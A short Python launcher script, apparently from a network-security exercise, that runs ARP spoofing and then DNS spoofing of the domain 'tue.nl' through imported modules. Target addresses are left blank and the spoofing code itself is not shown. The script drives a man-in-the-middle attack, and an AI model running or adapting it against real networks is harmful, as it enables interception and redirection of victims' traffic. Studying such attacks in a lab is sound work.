from src import arp_spoof as arp
from src import dns_spoof as dns

if __name__ == '__main__':
    arp_spoofing = arp.ARPSpoofing(interface="enp0s3", target_mac="", target_ip="", spoofed_ips=[""], delay=3)
    input("Press [enter] to start ARP spoofing")
    arp_spoofing.start()
    input("Press [enter] to start DNS spoofing")
    dns_spoofing = dns.DNSSpoofing(interface="enp0s3", domain_names=["tue.nl"], victims=[], redirect_ip="")
    dns_spoofing.start()
    input("Press [enter] to stop DNS spoofing")
    dns_spoofing.stop()
    input("Press [enter] to stop ARP spoofing")
    arp_spoofing.stop()